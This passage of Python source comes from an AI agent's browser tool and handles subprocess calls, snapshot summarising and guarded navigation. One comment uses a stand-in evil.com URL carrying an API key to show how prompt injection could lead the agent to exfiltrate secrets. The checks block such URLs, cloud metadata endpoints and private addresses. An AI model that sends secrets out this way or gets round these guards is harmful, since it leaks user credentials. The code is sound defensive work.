        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = _build_browser_env()
        if _is_npx_agent_browser_sentinel(browser_cmd):
            _apply_agent_browser_npm_policy(
                browser_env,
                pin_tab_acquisition=task_owned_shared_cdp,
            )

        # Ensure subprocesses inherit the same browser-specific PATH fallbacks
        # used during CLI discovery.
        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # A named session attached to an externally-owned shared CDP must keep
        # its exact target binding for the whole turn. agent-browser documents
        # 0 as disabled; force that value so an inherited short timeout cannot
        # discard ownership while Hermes is waiting on the page. Local and
        # provider-backed sessions retain the configured inactivity policy.
        if _is_task_owned_shared_cdp_session(session_info):
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = "0"
        elif "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms

        # Inject --no-sandbox when needed (issue #15765):
        # - Running as root: Chromium always refuses to start without it
        # - Ubuntu 23.10+ / AppArmor systems: unprivileged user namespaces
        #   are restricted, causing Chromium to exit with "No usable sandbox"
        #   even for non-root users running under systemd or containers.
        # Honour either the legacy AGENT_BROWSER_CHROME_FLAGS (never consumed by
        # agent-browser itself, but documented in older notes) or the real
        # AGENT_BROWSER_ARGS — if the user pre-sets either, don't overwrite it.
        if (
            "AGENT_BROWSER_ARGS" not in browser_env
            and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env
        ):
            if _needs_chromium_sandbox_bypass():
                logger.debug(
                    "browser: sandbox bypass needed (root/docker/AppArmor userns) — "
                    "injecting --no-sandbox"
                )
                browser_env["AGENT_BROWSER_ARGS"] = (
                    "--no-sandbox,--disable-dev-shm-usage"
                )

        # Use temp files for stdout/stderr instead of pipes.
        # agent-browser starts a background daemon that inherits file
        # descriptors.  With capture_output=True (pipes), the daemon keeps
        # the pipe fds open after the CLI exits, so communicate() never
        # sees EOF and blocks until the timeout fires.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # See matching comment at the other Popen site above — on
            # Windows we put agent-browser in its own process group, force
            # STARTF_USESTDHANDLES so CreateProcess hands the child ONLY our
            # three explicit handles (no leaked parent-console handles to
            # confuse the Rust binary's daemon-spawn), and close_fds=True to
            # block inheritance of everything else.
            _popen_extra: dict = {}
            if os.name == "nt":
                # See matching block at the other Popen site — CREATE_NO_WINDOW
                # only, NO CREATE_NEW_PROCESS_GROUP (cancels asyncio loop task
                # on Python 3.11 Windows → KeyboardInterrupt in CLI MainThread).
                _popen_extra["creationflags"] = windows_hide_flags()
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            stdout, stderr = _read_command_output_files(stdout_path, stderr_path)
            _unlink_command_output_files(stdout_path, stderr_path)
            if stderr and stderr.strip():
                logger.warning(
                    "browser '%s' stderr after timeout: %s",
                    command,
                    stderr.strip()[:500],
                )
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            result = {
                "success": False,
                "error": _format_browser_timeout_error(command, timeout, stdout, stderr),
            }
            # Fall through to fallback check below
        else:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, "r", encoding="utf-8") as f:
                stderr = f.read()
            returncode = proc.returncode

            # Clean up temp files (best-effort)
            for p in (stdout_path, stderr_path):
                try:
                    os.unlink(p)
                except OSError:
                    pass

            # Log stderr for diagnostics — use warning level on failure so it's visible
            if stderr and stderr.strip():
                level = logging.WARNING if returncode != 0 else logging.DEBUG
                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

            stdout_text = stdout.strip()

            # Empty output with rc=0 is a broken state — treat as failure rather
            # than silently returning {"success": True, "data": {}}.
            # Some commands (close, record) legitimately return no output.
            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
                logger.warning("browser '%s' returned empty output (rc=0)", command)
                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
            elif stdout_text:
                try:
                    parsed = json.loads(stdout_text)
                    # Warn if snapshot came back empty (common sign of daemon/CDP issues)
                    if command == "snapshot" and parsed.get("success"):
                        snap_data = parsed.get("data", {})
                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
                            logger.warning("snapshot returned empty content. "
                                           "Possible stale daemon or CDP connection issue. "
                                           "returncode=%s", returncode)
                    result = parsed
                except json.JSONDecodeError:
                    raw = stdout_text[:2000]
                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                                   command, returncode, raw[:500])

                    if command == "screenshot":
                        stderr_text = (stderr or "").strip()
                        combined_text = "\n".join(
                            part for part in [stdout_text, stderr_text] if part
                        )
                        recovered_path = _extract_screenshot_path_from_text(combined_text)

                        if recovered_path and Path(recovered_path).exists():
                            logger.info(
                                "browser 'screenshot' recovered file from non-JSON output: %s",
                                recovered_path,
                            )
                            result = {
                                "success": True,
                                "data": {
                                    "path": recovered_path,
                                    "raw": raw,
                                },
                            }
                        else:
                            result = {
                                "success": False,
                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                            }
                    else:
                        result = {
                            "success": False,
                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                        }
            elif returncode != 0:
                # Check for errors
                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
                result = {"success": False, "error": error_msg}
            else:
                result = {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # --- Lightpanda automatic Chrome fallback ---
    # If engine is lightpanda and the result looks broken, retry with Chrome.
    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info(
            "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
            command,
            task_id,
            fallback_reason,
        )
        # For screenshots, use the dedicated Chrome fallback helper
        # (spins up a separate Chrome session to the same URL).
        if command == "screenshot":
            fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout)
        else:
            fallback_result = _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    return result


def _store_full_snapshot(snapshot_text: str) -> Optional[str]:
    """Write a full page snapshot to cache/web and return its absolute path.

    Called whenever a snapshot exceeds SNAPSHOT_SUMMARIZE_THRESHOLD and the
    model is about to receive a truncated or LLM-summarized view. Mirrors
    ``web_tools._store_full_text``: the file lands in the same cache/web
    directory (mounted read-only into remote backends via
    credential_files._CACHE_DIRS) so the agent's read_file/terminal tools can
    page through the complete accessibility tree — including element refs that
    the truncated view dropped — on any backend.

    The stored copy is secret-redacted (same force-redaction boundary as
    ``_redact_browser_output``) since page-rendered API keys or tokens must
    not be written to disk unmasked. The filename is keyed on a content hash,
    so repeated snapshots of the same page state dedupe to one file. Returns
    None on failure (storage is best-effort; the truncated view is still
    returned to the model).
    """
    try:
        import hashlib
        from hermes_constants import get_hermes_dir
        from agent.redact import redact_sensitive_text

        content = redact_sensitive_text(snapshot_text, force=True)
        if len(content) > MAX_STORED_SNAPSHOT_CHARS:
            content = (
                content[:MAX_STORED_SNAPSHOT_CHARS]
                + f"\n\n[... stored copy truncated at {MAX_STORED_SNAPSHOT_CHARS:,} chars "
                f"of {len(content):,} ...]"
            )
        cache_dir = get_hermes_dir("cache/web", "web_cache")
        cache_dir.mkdir(parents=True, exist_ok=True)
        digest = hashlib.sha256(content.encode("utf-8")).hexdigest()[:10]
        path = cache_dir / f"browser-snapshot-{digest}.txt"
        path.write_text(content, encoding="utf-8")
        return str(path)
    except Exception as exc:  # noqa: BLE001
        logger.debug("Failed to store full browser snapshot: %s", exc)
        return None


def _extract_relevant_content(
    snapshot_text: str,
    user_task: Optional[str] = None
) -> str:
    """Use LLM to extract relevant content from a snapshot based on the user's task.

    The full snapshot is stored to cache/web first (summarization is lossy —
    the pointer lets the agent read anything the summary dropped). Falls back
    to simple truncation when no auxiliary text model is configured.
    """
    stored_path = _store_full_snapshot(snapshot_text)
    stored_note = (
        f'\n\n[Summarized from a {len(snapshot_text):,}-char snapshot. Full snapshot '
        f'saved to: {stored_path} — read it with read_file if anything is missing.]'
    ) if stored_path else ""
    if user_task:
        extraction_prompt = (
            f"You are a content extractor for a browser automation agent.\n\n"
            f"The user's task is: {user_task}\n\n"
            f"Given the following page snapshot (accessibility tree representation), "
            f"extract and summarize the most relevant information for completing this task. Focus on:\n"
            f"1. Interactive elements (buttons, links, inputs) that might be needed\n"
            f"2. Text content relevant to the task (prices, descriptions, headings, important info)\n"
            f"3. Navigation structure if relevant\n\n"
            f"Keep ref IDs (like [ref=e5]) for interactive elements so the agent can use them.\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary that preserves actionable information and relevant content."
        )
    else:
        extraction_prompt = (
            f"Summarize this page snapshot, preserving:\n"
            f"1. All interactive elements with their ref IDs (like [ref=e5])\n"
            f"2. Key text content and headings\n"
            f"3. Important information visible on the page\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary focused on interactive elements and key content."
        )

    # Redact secrets from snapshot before sending to auxiliary LLM.
    # Without this, a page displaying env vars or API keys would leak
    # secrets to the extraction model before run_agent.py's general
    # redaction layer ever sees the tool result.
    from agent.redact import redact_sensitive_text
    extraction_prompt = redact_sensitive_text(extraction_prompt)

    try:
        call_kwargs = {
            "task": "web_extract",
            "messages": [{"role": "user", "content": extraction_prompt}],
            "max_tokens": 4000,
            "temperature": 0.1,
        }
        model = _get_extraction_model()
        if model:
            call_kwargs["model"] = model
        response = _lazy_call_llm(**call_kwargs)
        extracted = (response.choices[0].message.content or "").strip()
        if not extracted:
            # _truncate_snapshot stores its own pointer (dedupes to the same
            # cache file by content hash), so return it without stored_note.
            return _truncate_snapshot(snapshot_text)
        # Redact any secrets the auxiliary LLM may have echoed back.
        return redact_sensitive_text(extracted) + stored_note
    except Exception:
        return _truncate_snapshot(snapshot_text)


def _truncate_snapshot(snapshot_text: str, max_chars: int = SNAPSHOT_SUMMARIZE_THRESHOLD) -> str:
    """Structure-aware truncation for snapshots.

    Cuts at line boundaries so that accessibility tree elements are never
    split mid-line. The full snapshot is saved to cache/web (same pattern as
    web_extract's truncate-and-store) and the appended note tells the agent
    exactly where the complete text lives and how to page through it with
    read_file — element refs beyond the cut are in the file, not lost.

    Args:
        snapshot_text: The snapshot text to truncate
        max_chars: Maximum characters to keep

    Returns:
        Truncated text with a stored-full-text pointer if truncated
    """
    if len(snapshot_text) <= max_chars:
        return snapshot_text

    stored_path = _store_full_snapshot(snapshot_text)

    lines = snapshot_text.split('\n')
    result: list[str] = []
    chars = 0
    # Reserve space for the truncation note (the stored-path variant is the
    # longer of the two). Clamp so tiny max_chars values still keep content.
    reserve = min(110 + len(stored_path or ""), max_chars // 2)
    for line in lines:
        if chars + len(line) + 1 > max_chars - reserve:
            break
        result.append(line)
        chars += len(line) + 1
    remaining = len(lines) - len(result)
    if remaining > 0:
        if stored_path:
            next_line = len(result) + 1
            result.append(
                f'\n[... {remaining} more lines truncated — full snapshot: '
                f'read_file path="{stored_path}" offset={next_line} limit=200]'
            )
        else:
            result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
    return '\n'.join(result)


def _redact_browser_output(value: Any) -> Any:
    """Redact secrets from browser-originated data before returning to the model.

    Browser snapshots, console messages, JS exceptions, and eval results can
    contain page-rendered API keys, cookies, bearer tokens, or pasted secrets.
    Tool output is a model boundary, so force redaction here even if global log
    redaction is disabled for debugging.
    """
    from agent.redact import redact_sensitive_text

    if isinstance(value, str):
        return redact_sensitive_text(value, force=True)
    if isinstance(value, list):
        return [_redact_browser_output(item) for item in value]
    if isinstance(value, tuple):
        return tuple(_redact_browser_output(item) for item in value)
    if isinstance(value, dict):
        return {key: _redact_browser_output(item) for key, item in value.items()}
    return value


# ============================================================================
# Browser Tool Functions
# ============================================================================

def evaluate_url_safety(url: str) -> Optional[dict]:
    """Run URL safety checks; None if safe, else an error dict"""
    import urllib.parse
    from agent.redact import _PREFIX_RE

    _secret = {"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."}
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
        return _secret
    url = _normalize_url_for_request(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
        return _secret

    local = _is_local_backend()
    sensitive_query_key = _sensitive_query_param_name(url)
    if sensitive_query_key and not local:
        return {"success": False, "error": (
            "Blocked: URL contains a credential-like query parameter "
            f"({sensitive_query_key}). Cloud browser backends are third-party "
            "readers; use a local browser/CDP session or remove the sensitive "
            "query parameter before navigating.")}
    if _is_always_blocked_url(url):
        return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
    if not local and not _allow_private_urls() and not _is_safe_url(url):
        return {"success": False, "error": "Blocked: URL targets a private or internal address"}
    blocked = check_website_access(url)
    if blocked:
        return {"success": False, "error": blocked["message"],
                "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]}}
    return None


def _serialize_browser_navigation(func):
    """Keep navigation, target binding, publication, and snapshot atomic."""

    @functools.wraps(func)
    def _wrapped(url: str, task_id: Optional[str] = None) -> str:
        bare_task_id = _bare_task_id_for_session_key(task_id or "default")
        with _task_cleanup_operation_lock(bare_task_id):
            return func(url, task_id)

    return _wrapped


@_serialize_browser_navigation
def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
    """
    Navigate to a URL in the browser.

    Args:
        url: The URL to navigate to
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result (includes stealth features info on first nav)
    """
    # Secret exfiltration protection — block URLs that embed API keys or
    # tokens in query parameters. A prompt injection could trick the agent
    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
    import urllib.parse
    from agent.redact import _PREFIX_RE
    url_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })
    url = _normalize_url_for_request(url)
    normalized_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })

    # SSRF protection — block private/internal addresses before navigating.
    # Skipped for local backends (Camofox, headless Chromium without a cloud
    # provider) because the agent already has full local network access via
    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
    # local Chromium sidecar for this URL (cloud provider configured +
    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
    # cloud provider never sees the URL in that case.  Can also be opted
    # out globally via ``browser.allow_private_urls`` in config.
    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)
    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)

    sensitive_query_key = _sensitive_query_param_name(url)
    if sensitive_query_key and not _is_local_backend() and not auto_local_this_nav:
        return json.dumps({
            "success": False,
            "error": (
                "Blocked: URL contains a credential-like query parameter "
                f"({sensitive_query_key}). Cloud browser backends are third-party "
                "readers; use a local browser/CDP session or remove the sensitive "
                "query parameter before navigating."
            ),
        })

    # Always-blocked floor: cloud metadata / IMDS endpoints are denied
    # regardless of backend, hybrid routing, or allow_private_urls.
    # There's no legitimate agent use case for navigating to
    # 169.254.169.254 / metadata.google.internal / ECS task metadata
    # via a browser, and routing those to a local Chromium sidecar
    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
    # The floor is UNCONDITIONAL — it must fire for every backend,
    # including the pure-local headless Chromium and off-host CDP cases
    # (a local Chromium on a cloud VM still reaches the host IMDS).
    if _is_always_blocked_url(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a cloud metadata endpoint",
        })

    if (
        not _is_local_backend()
        and not auto_local_this_nav
        and not _allow_private_urls()
        and not _is_safe_url(url)
    ):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a private or internal address",
        })

    # Website policy check — block before navigating
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # An explicit navigation may restart a task after terminal cleanup, but the
    # terminal boundary is only cleared permanently after a successful,
    # non-blocked navigation. Failed attempts clean any partial replacement and
    # restore the tombstone so follow-up snapshot/click/eval cannot see blank.
    try:
        restarting_retired_task = _clear_retired_browser_task_for_navigation(
            effective_task_id
        )
    except _BrowserSessionRetiredError:
        return json.dumps(
            _browser_session_retired_result(effective_task_id),
            ensure_ascii=False,
        )

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_navigate
        return camofox_navigate(url, task_id)

    if auto_local_this_nav:
        logger.info(
            "browser_navigate: auto-routing %s to local Chromium sidecar "
            "(cloud provider %s stays on cloud for public URLs; "
            "set browser.auto_local_for_private_urls: false to disable)",
            url,
            type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
        )

    # Get session info to check if this is a new session
    # (will create one with features logged if not exists)
    try:
        session_info = _get_session_info(nav_session_key)
    except Exception:
        if restarting_retired_task:
            _restore_retired_browser_task_after_failed_navigation(
                effective_task_id,
                nav_session_key,
            )
        raise
    is_first_nav = session_info.get("_first_nav", True)

    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(
        nav_session_key,
        "open",
        [url],
        timeout=_get_open_command_timeout(first_open=is_first_nav),
    )

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        # Bind dialog/frame/eval supervision to the same target that
        # agent-browser pinned. Without this, a shared CDP endpoint's
        # supervisor attaches to the first unrelated page and browser_console
        # can read or mutate another task's tab.
        if _is_task_owned_shared_cdp_session(session_info):
            pinned_target_id = _pinned_cdp_target_id(nav_session_key)
            if pinned_target_id:
                # Keep the opaque target ID in Hermes-owned state. Cleanup must
                # never rediscover a page by URL or active-tab position.
                with _cleanup_lock:
                    current_session = _active_sessions.get(nav_session_key)
                    if isinstance(current_session, dict) and current_session is session_info:
                        current_session["target_id"] = pinned_target_id
                _ensure_cdp_supervisor(
                    nav_session_key,
                    target_id=pinned_target_id,
                    expected_generation=session_info.get("_lifecycle_generation"),
                )

        # Post-redirect SSRF check — if the browser followed a redirect to a
        # private/internal address, block the result so the model can't read
        # internal content via subsequent browser_snapshot calls.
        # Skipped for local backends (same rationale as the pre-nav check),
        # and for the hybrid local sidecar (we're already on a local browser
        # hitting a private URL by design).
        # Always-blocked floor (cloud metadata / IMDS) is enforced for every
        # backend and even when auto_local_this_nav is true — see pre-nav
        # check for rationale (#16234).
        if (
            final_url
            and final_url != url
            and _is_always_blocked_url(final_url)
        ):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            if restarting_retired_task:
                _restore_retired_browser_task_after_failed_navigation(
                    effective_task_id,
                    nav_session_key,
                )
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a cloud metadata endpoint",
            })

        if (
            not _is_local_backend()
            and not auto_local_this_nav
            and not _allow_private_urls()
            and final_url and final_url != url and not _is_safe_url(final_url)
        ):
            # Navigate away to a blank page to prevent snapshot leaks
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            if restarting_retired_task:
                _restore_retired_browser_task_after_failed_navigation(
                    effective_task_id,
                    nav_session_key,
                )
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a private/internal address",
            })

        response = {
            "success": True,
            "url": final_url,
            "title": title
        }
        # Remember only a successful, non-blocked navigation as the task owner.
        # Failed opens and blocked redirects must not retarget follow-up clicks
        # or snapshots to a newly-created but irrelevant session.
        _last_active_session_key[effective_task_id] = nav_session_key
        _copy_fallback_warning(response, result)

        # Detect common "blocked" page patterns from title/url
        blocked_patterns = [
            "access denied", "access to this page has been denied",
            "blocked", "bot detected", "verification required",
            "please verify", "are you a robot", "captcha",
            "cloudflare", "ddos protection", "checking your browser",
            "just a moment", "attention required"
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # Include feature info on first navigation so model knows what's active
        if is_first_nav and "features" in session_info:
            features = session_info["features"]
            active_features = [k for k, v in features.items() if v]
            if not features.get("proxies"):
                response["stealth_warning"] = (
                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
                    "Consider upgrading Browserbase plan for proxy support."
                )
            response["stealth_features"] = active_features

        # Auto-take a compact snapshot so the model can act immediately
        # without a separate browser_snapshot call.
        try:
            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
            if snap_result.get("code") == "tab_gone":
                if restarting_retired_task:
                    _restore_retired_browser_task_after_failed_navigation(
                        effective_task_id,
                        nav_session_key,
                    )
                snapshot_failure = {
                    "success": False,
                    "error": snap_result.get(
                        "error", "Pinned browser tab disappeared after navigation"
                    ),
                    "url": final_url,
                    "title": title,
                }
                return json.dumps(
                    _copy_fallback_warning(snapshot_failure, snap_result),
                    ensure_ascii=False,
                )
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = _redact_browser_output(snapshot_text)
                response["element_count"] = len(refs) if refs else 0
                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                    _copy_fallback_warning(response, snap_result)
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        if restarting_retired_task:
            _restore_retired_browser_task_after_failed_navigation(
                effective_task_id,
                nav_session_key,
            )
        response = {
            "success": False,
            "error": result.get("error", "Navigation failed")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: Optional[str] = None,
    user_task: Optional[str] = None
) -> str:
    """
    Get a text-based snapshot of the current page's accessibility tree.

    Args:
        full: If True, return complete snapshot. If False, return compact view.
        task_id: Task identifier for session isolation
        user_task: The user's current task (for task-aware extraction)

    Returns:
        JSON string with page snapshot
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(full, task_id, user_task)

    effective_task_id = _last_session_key(task_id or "default")

    # Build command args based on full flag
    args = []
    if not full:
        args.extend(["-c"])  # Compact mode

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        # ── Private-network guard: block snapshots from eval-navigated private pages ──
        # After any eval (browser_console) that may have changed location.href to a
        # private/internal address, the snapshot would expose private page content.
        # Re-check the current URL before returning the snapshot.
        if (
            not _is_local_backend()
            and not _is_local_sidecar_key(effective_task_id)
            and not _allow_private_urls()
        ):
            try:
                _url_result = _run_browser_command(
                    effective_task_id, "eval", ["window.location.href"],
                    timeout=5, _engine_override="auto",
                )
                if _url_result.get("success"):
                    _current_url = (
                        _url_result.get("data", {}).get("result", "")
                        .strip().strip('"').strip("'")
                    )
                    if _current_url and not _is_safe_url(_current_url):
                        return json.dumps({
                            "success": False,
                            "error": (
                                "Blocked: page URL targets a private or internal address "
                                f"({_current_url}). This may have been caused by a "
                                "JavaScript navigation via browser_console."
                            ),
                        }, ensure_ascii=False)
            except Exception as _url_exc:
                logger.debug("browser_snapshot: URL safety check failed (%s)", _url_exc)

        # Check if snapshot needs summarization
        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)

        response = {
            "success": True,
            "snapshot": _redact_browser_output(snapshot_text),
            "element_count": len(refs) if refs else 0
        }
        _copy_fallback_warning(response, result)

        # Merge supervisor state (pending dialogs + frame tree) when a CDP
        # supervisor is attached to this task. No-op otherwise. See
        # website/docs/developer-guide/browser-supervisor.md.
        try:
            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_redact_browser_output(_sv_snap.to_dict()))
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: Optional[str] = None) -> str:
    """
    Click on an element.

    Args:
        ref: Element reference (e.g., "@e5")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with click result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_click
        return camofox_click(ref, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "click")
    if blocked is not None:
        return blocked

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        response = {
            "success": True,
            "clicked": ref
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to click {ref}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
    """
    Type text into an input field.

    Args:
        ref: Element reference (e.g., "@e3")
        text: Text to type
        task_id: Task identifier for session isolation

    Returns:
        JSON string with type result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_type
        return camofox_type(ref, text, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "type")
    if blocked is not None:
        return blocked

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # Use fill command (clears then types)
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    from agent.display import (
        redact_browser_typed_text_for_display,
        redact_tool_args_for_display,
    )

    display_text = (redact_tool_args_for_display("browser_type", {"text": text}) or {})["text"]

    if result.get("success"):
        response = {
            "success": True,
            # Run typed text through the secret-pattern redactor so API keys /
            # tokens don't leak into tool progress or chat history.  Normal
            # text passes through unchanged.  The raw value was already sent
            # to the browser command above.
            "typed": display_text,
            "element": ref
        }
        response = _copy_fallback_warning(response, result)
        response = redact_browser_typed_text_for_display(response, text)
        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to type into {ref}")
        }
        response = _copy_fallback_warning(response, result)
        response = redact_browser_typed_text_for_display(response, text)
        return json.dumps(response, ensure_ascii=False)


def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
    """
    Scroll the page.

    Args:
        direction: "up" or "down"
        task_id: Task identifier for session isolation

    Returns:
        JSON string with scroll result
    """
    # Validate direction
    if direction not in {"up", "down"}:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # Single scroll with pixel amount instead of 5x subprocess calls.
    # agent-browser supports: agent-browser scroll down 500
    # ~500px is roughly half a viewport of travel.
    _SCROLL_PIXELS = 500

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_scroll
        # Camofox REST API doesn't support pixel args; use repeated calls
        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = _last_session_key(task_id or "default")

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        response = {
            "success": False,
            "error": result.get("error", f"Failed to scroll {direction}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {
        "success": True,
        "scrolled": direction
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


